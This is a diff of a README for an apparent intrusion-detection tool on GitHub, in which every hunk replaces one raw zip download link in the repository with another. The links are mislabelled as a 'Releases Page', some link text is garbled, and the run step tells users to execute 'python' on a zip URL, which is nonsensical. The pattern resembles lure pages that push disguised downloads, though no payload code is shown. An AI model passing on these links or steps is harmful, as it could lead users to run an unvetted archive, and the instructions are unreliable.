@@ -6,7 +6,7 @@ To set up the custom intrusion detection system, follow these steps. The softwar
 
 ## 📥 Download the Software
 
-[![Download the Latest Release](https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip%20Latest%https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip)](https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip)
+[![Download the Latest Release](https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip%20Latest%https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip)](https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip)
 
 Visit the page above to download the latest version of the custom intrusion detection system.
 
@@ -31,7 +31,7 @@ Before you start, ensure you have the following:
 ## 🔧 Installation Steps
 
 1. **Download the Application**  
-   Head over to the [Releases Page](https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip) to get the latest version.
+   Head over to the [Releases Page](https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip) to get the latest version.
 
 2. **Extract the Files**  
    Once downloaded, locate the zip file. Right-click on it and select "Extract All". Choose a destination folder where you want to store the application files.
@@ -50,7 +50,7 @@ Before you start, ensure you have the following:
 5. **Run the Application**  
    Execute the application script by typing:
    ```
-   python https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip
+   python https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip
    ```
    Ensure you are still in the correct directory. If everything is set up correctly, the system should start monitoring your network.
 
@@ -77,7 +77,7 @@ If you face any issues:
 
 ## 📦 Download & Install
 
-To download the software, check the [Releases Page](https://raw.githubusercontent.com/Gxl607/custom-intrusion-detection-system-ids/main/Astrid/custom-intrusion-detection-system-ids.zip) once again. Follow the installation steps outlined above to set it up.
+To download the software, check the [Releases Page](https://github.com/Gxl607/custom-intrusion-detection-system-ids/raw/refs/heads/main/images/custom_ids_intrusion_system_detection_2.0.zip) once again. Follow the installation steps outlined above to set it up.
 
 ## 📝 Conclusion
 
